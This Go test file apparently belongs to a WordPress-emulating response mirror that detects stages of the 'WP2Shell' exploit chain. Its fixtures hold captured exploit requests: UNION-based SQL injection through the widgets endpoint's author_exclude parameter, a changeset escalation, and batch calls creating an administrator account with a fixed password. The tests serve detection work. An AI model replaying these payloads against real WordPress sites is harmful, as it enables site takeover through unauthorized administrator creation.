package plugins

import (
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// Task 4: recognize the WP2Shell exploit's S2 (oembed seed) and S3
// (escalation + admin creation) batches through the shipped MirrorRespond
// plumbing, and set the corresponding ChainSession checkpoints. Fixtures
// below are copied verbatim (byte-exact, not hand-rolled) from a real
// captured exploitation run: tools/oracle-diff/wordpress-6.9.4/chain_capture.jsonl
// (seq 10 = S2 seed batch, seq 90 = S3 escalation+admin-creation batch),
// following the same "literal capture, not read at test time" discipline
// forge_test.go's forgeU3158/forgeB205 fixtures already use.
// ---------------------------------------------------------------------------

// seedBatchS2 is the exact S2 seed request body: a single-row UNION forge on
// /wp/v2/widgets whose forged post_content (hex-encoded) is three
// back-to-back "[embed ...][/embed]" shortcodes — the exploit's own
// oembed-cache-seeding stage (poc.py's seed_query/send_batch).
const seedBatchS2 = `{"requests": [{"method": "POST", "path": "http://:"}, {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": [{"method": "GET", "path": "http://:"}, {"method": "GET", "path": "/wp/v2/widgets?author_exclude=1%29+AND+1%3D0+UNION+ALL+SELECT+0%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x5b656d6265642077696474683d2235303022206865696768743d22373530225d687474703a2f2f3132372e302e302e313a383039392f68656c6c6f2d776f726c642f23326634333931363735383766305b2f656d6265645d5b656d6265642077696474683d2235303022206865696768743d22373530225d687474703a2f2f3132372e302e302e313a383039392f68656c6c6f2d776f726c642f23326634333931363735383766315b2f656d6265645d5b656d6265642077696474683d2235303022206865696768743d22373530225d687474703a2f2f3132372e302e302e313a383039392f68656c6c6f2d776f726c642f23326634333931363735383766325b2f656d6265645d%2C0x73656564%2C%27%27%2C0x7075626c697368%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x73656564%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C0%2C%27%27%2C0%2C0x706f7374%2C%27%27%2C0+--+-&per_page=-1&orderby=none&context=view"}, {"method": "GET", "path": "/wp/v2/posts"}]}}, {"method": "POST", "path": "/batch/v1"}]}`

// escalationBatchS3Raw is the exact S3 batch: a 7-row UNION forge on
// /wp/v2/widgets (customize_changeset row2 among them) plus two POST
// /wp/v2/users sub-requests carrying the forged administrator's credentials
// (poc.py's escalation_query + new_admin + send_batch). Username is
// substituted per-test via escalationBatchS3 so tests can pin an exact,
// readable value ("w2s_test") rather than the capture's random token, while
// keeping every other byte — the escalation UNION shape, the
// customize_changeset marker, the batch nesting — real.
const escalationBatchS3Raw = `{"requests": [{"method": "POST", "path": "http://:"}, {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": [{"method": "GET", "path": "http://:"}, {"method": "GET", "path": "/wp/v2/widgets?author_exclude=1%29+AND+1%3D0+UNION+ALL+SELECT+0%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x5b656d6265642077696474683d2235303022206865696768743d22373530225d687474703a2f2f3132372e302e302e313a383039392f68656c6c6f2d776f726c642f23326634333931363735383766315b2f656d6265645d%2C0x74726967676572%2C%27%27%2C0x7075626c697368%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x74726967676572%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C0%2C%27%27%2C0%2C0x706f7374%2C%27%27%2C0+UNION+ALL+SELECT+4%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x7b226e61765f6d656e755f6974656d5b313830383337333037385d223a7b2276616c7565223a7b226f626a6563745f6964223a302c226f626a656374223a22222c226d656e755f6974656d5f706172656e74223a302c22706f736974696f6e223a302c2274797065223a22637573746f6d222c227469746c65223a2270726f6f66222c2275726c223a2268747470733a2f2f6769746875622e636f6d2f73657267696f696e74656c2f7770327368656c6c2d706f63222c22746172676574223a22222c22617474725f7469746c65223a22222c226465736372697074696f6e223a2270726f6f66222c22636c6173736573223a22222c2278666e223a22222c22737461747573223a227075626c697368222c226e61765f6d656e755f7465726d5f6964223a302c225f696e76616c6964223a66616c73657d2c2274797065223a226e61765f6d656e755f6974656d222c22757365725f6964223a317d7d%2C0x6368616e6765736574%2C%27%27%2C0x667574757265%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x39306135616537372d303133352d343835352d393762622d393338343561633230366263%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C1808373077%2C%27%27%2C0%2C0x637573746f6d697a655f6368616e6765736574%2C%27%27%2C0+UNION+ALL+SELECT+1808373077%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x6f75746572%2C0x6f75746572%2C%27%27%2C0x6472616674%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x6f75746572%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C4%2C%27%27%2C0%2C0x706f7374%2C%27%27%2C0+UNION+ALL+SELECT+5%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C0x6361636865%2C%27%27%2C0x7075626c697368%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x6361636865%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C4%2C%27%27%2C0%2C0x706f7374%2C%27%27%2C0+UNION+ALL+SELECT+1808373078%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x6e6176%2C0x6e6176%2C%27%27%2C0x7075626c697368%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x6e6176%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C6%2C%27%27%2C0%2C0x6e61765f6d656e755f6974656d%2C%27%27%2C0+UNION+ALL+SELECT+6%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x7061727365%2C0x7061727365%2C%27%27%2C0x7061727365%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x7061727365%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C1808373079%2C%27%27%2C0%2C0x72657175657374%2C%27%27%2C0+UNION+ALL+SELECT+1808373079%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x696e6e6572%2C0x696e6e6572%2C%27%27%2C0x6472616674%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x696e6e6572%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C6%2C%27%27%2C0%2C0x706f7374%2C%27%27%2C0+--+-&per_page=-1&orderby=none&context=view"}, {"method": "GET", "path": "/wp/v2/posts"}, {"method": "POST", "path": "/wp/v2/users", "body": {"username": "USERNAME_PLACEHOLDER", "email": "USERNAME_PLACEHOLDER@wp2shell.shellcode.lol", "password": "W2s!FUZ8Lzj93cTy_HKARaVN", "roles": ["administrator"]}}, {"method": "POST", "path": "/wp/v2/users", "body": {"username": "USERNAME_PLACEHOLDER", "email": "USERNAME_PLACEHOLDER@wp2shell.shellcode.lol", "password": "W2s!FUZ8Lzj93cTy_HKARaVN", "roles": ["administrator"]}}]}}, {"method": "POST", "path": "/batch/v1"}]}`

// escalationBatchS3 substitutes an exact, readable username into the real
// captured escalation+admin-creation batch (see escalationBatchS3Raw).
func escalationBatchS3(username string) string {
	return strings.ReplaceAll(escalationBatchS3Raw, "USERNAME_PLACEHOLDER", username)
}

// sessSnapshot reads the checkpoint fields under the mandatory mutate
// accessor (never a bare field read — see ChainSession's doc comment) and
// returns them as plain values for assertions.
func sessSnapshot(sess *ChainSession) (seeded, adminCreated bool, username string) {
	sess.mutate(func(cs *ChainSession) {
		seeded = cs.seeded
		adminCreated = cs.adminCreated
		username = cs.username
	})
	return
}

// TestChainStages_SeedSetsCheckpoint drives the real S2 seed batch through
// MirrorRespond with an armed session and asserts sess.seeded flips true
// while the forge echo (the existing, T3-shipped assembleForgedRow path) is
// still served untouched.
func TestChainStages_SeedSetsCheckpoint(t *testing.T) {
	sess := newChainSession()
	_, body, ok := MirrorRespond(forgeOnlyMirror(), []byte(seedBatchS2), sess)
	if !ok {
		t.Fatal("MirrorRespond returned ok=false")
	}
	seeded, adminCreated, username := sessSnapshot(sess)
	if !seeded {
		t.Fatal("sess.seeded must be true after an S2 seed batch")
	}
	if adminCreated || username != "" {
		t.Fatalf("S2 batch must not touch admin-creation checkpoints: adminCreated=%v username=%q", adminCreated, username)
	}
	// the forge echo itself: rendered content carries the seed shortcode.
	if !strings.Contains(body, "[embed") {
		t.Fatalf("expected the seed forge echo (rendered [embed content) in response, got: %s", body)
	}
	if !strings.Contains(body, `"status":200`) {
		t.Fatalf("seed forge element must be status 200, got: %s", body)
	}
}

// TestChainStages_EscalationSetsAdminCreatedAndUsername drives the real S3
// escalation+admin-creation batch through MirrorRespond with an armed
// session and asserts BOTH sess.adminCreated and sess.username are set (in
// one mutate, per the concurrency contract) AND the response carries a 201
// "user created" element for that exact username.
func TestChainStages_EscalationSetsAdminCreatedAndUsername(t *testing.T) {
	sess := newChainSession()
	_, body, ok := MirrorRespond(forgeOnlyMirror(), []byte(escalationBatchS3("w2s_test")), sess)
	if !ok {
		t.Fatal("MirrorRespond returned ok=false")
	}
	_, adminCreated, username := sessSnapshot(sess)
	if !adminCreated {
		t.Fatal("sess.adminCreated must be true after an S3 escalation+admin batch")
	}
	if username != "w2s_test" {
		t.Fatalf("sess.username = %q, want %q", username, "w2s_test")
	}
	if !strings.Contains(body, `"status":201`) {
		t.Fatalf("expected a 201 user-created element in response, got: %s", body)
	}
	if !strings.Contains(body, `"username":"w2s_test"`) {
		t.Fatalf("expected the forged user object to echo the username, got: %s", body)
	}
	if !strings.Contains(body, `"roles":["administrator"]`) {
		t.Fatalf("expected the forged user object to carry the administrator role, got: %s", body)
	}
}

// TestChainStages_EscalationSetsAdminCreated_NilSessRegression proves the
// exact S3 payload that flips the checkpoint above produces byte-identical,
// panic-free output when sess == nil — no admin-created element is forged
// (POST /wp/v2/users falls through to forgeOnlyMirror's Default, since it
// defines no matching rule), and MirrorRespond still succeeds.
func TestChainStages_EscalationSetsAdminCreated_NilSessRegression(t *testing.T) {
	_, body, ok := MirrorRespond(forgeOnlyMirror(), []byte(escalationBatchS3("w2s_test")), nil)
	if !ok {
		t.Fatal("MirrorRespond returned ok=false with nil sess")
	}
	if strings.Contains(body, `"status":201`) {
		t.Fatalf("nil sess must never forge an admin-created element, got: %s", body)
	}
	if strings.Contains(body, "w2s_test") {
		t.Fatalf("nil sess must not echo the username anywhere, got: %s", body)
	}
}

// TestChainStages_BenignBatch_NoAdminCreated is the FALSE case: a plain
// batch with no escalation UNION and no POST /wp/v2/users at all must leave
// both checkpoints false and inject no 201 element.
func TestChainStages_BenignBatch_NoAdminCreated(t *testing.T) {
	sess := newChainSession()
	req := `{"requests":[{"method":"POST","path":"http://:"},{"method":"POST","path":"/wp/v2/posts"},{"method":"POST","path":"/batch/v1"}]}`
	_, body, ok := MirrorRespond(forgeOnlyMirror(), []byte(req), sess)
	if !ok {
		t.Fatal("MirrorRespond returned ok=false")
	}
	seeded, adminCreated, username := sessSnapshot(sess)
	if seeded || adminCreated || username != "" {
		t.Fatalf("benign batch must leave all checkpoints untouched: seeded=%v adminCreated=%v username=%q", seeded, adminCreated, username)
	}
	if strings.Contains(body, `"status":201`) {
		t.Fatalf("benign batch must not inject a 201 element, got: %s", body)
	}
}

// TestChainStages_UsersPostWithoutEscalation_NoAdminCreated is the second
// FALSE case: a `POST /wp/v2/users` carrying a username, but with NO
// escalation UNION forge anywhere in the same batch, must NOT set
// adminCreated — a lone user-list/creation probe must not trip the
// checkpoint. Requires BOTH signals together, per the task brief.
func TestChainStages_UsersPostWithoutEscalation_NoAdminCreated(t *testing.T) {
	sess := newChainSession()
	req := `{"requests":[{"method":"POST","path":"http://:"},{"method":"POST","path":"/wp/v2/posts","body":{"requests":[{"method":"GET","path":"http://:"},{"method":"POST","path":"/wp/v2/users","body":{"username":"lone_probe","email":"lone_probe@example.com","roles":["administrator"]}},{"method":"GET","path":"/wp/v2/posts"}]}},{"method":"POST","path":"/batch/v1"}]}`
	_, body, ok := MirrorRespond(forgeOnlyMirror(), []byte(req), sess)
	if !ok {
		t.Fatal("MirrorRespond returned ok=false")
	}
	_, adminCreated, username := sessSnapshot(sess)
	if adminCreated || username != "" {
		t.Fatalf("a lone POST /wp/v2/users with no escalation forge must not set the checkpoint: adminCreated=%v username=%q", adminCreated, username)
	}
	if strings.Contains(body, `"status":201`) || strings.Contains(body, "lone_probe") {
		t.Fatalf("no 201 element / username echo expected without the escalation signal, got: %s", body)
	}
}

// TestChainStages_ZeroRegression_ShippedGoldensUnaffected re-runs the
// pre-existing Forge/reflection/timing goldens (defined in
// responsemirror_test.go / forge_test.go) with sess == nil and confirms
// byte-identical output — this task's changes must not perturb any shipped
// behaviour when no session is armed.
func TestChainStages_ZeroRegression_ShippedGoldensUnaffected(t *testing.T) {
	req := `{"requests":[{"method":"POST","path":"http://:"},{"method":"POST","path":"/wp/v2/posts"},{"method":"POST","path":"/wp/v2/users"},{"method":"POST","path":"/wp/v2/block-renderer/core/archives"},{"method":"POST","path":"/batch/v1"},{"method":"POST","path":"/wp/v2/does-not-exist"}]}`
	_, body, ok := MirrorRespond(wpMirror(), []byte(req), nil)
	if !ok || body != goldenAllTypes {
		t.Fatalf("golden-all-types regressed with nil sess:\n got: %s\nwant: %s", body, goldenAllTypes)
	}

	_, bodyU3158, okU := MirrorRespond(forgeOnlyMirror(), []byte(forgeU3158), nil)
	if !okU || !strings.Contains(bodyU3158, "||4F4B||") {
		t.Fatalf("forge U3158 golden regressed with nil sess: ok=%v body=%s", okU, bodyU3158)
	}

	_, bodyB205, okB := MirrorRespond(forgeOnlyMirror(), []byte(forgeB205), nil)
	if !okB || !strings.Contains(bodyB205, "35667ba4eb25") {
		t.Fatalf("forge B205 golden regressed with nil sess: ok=%v body=%s", okB, bodyB205)
	}
}
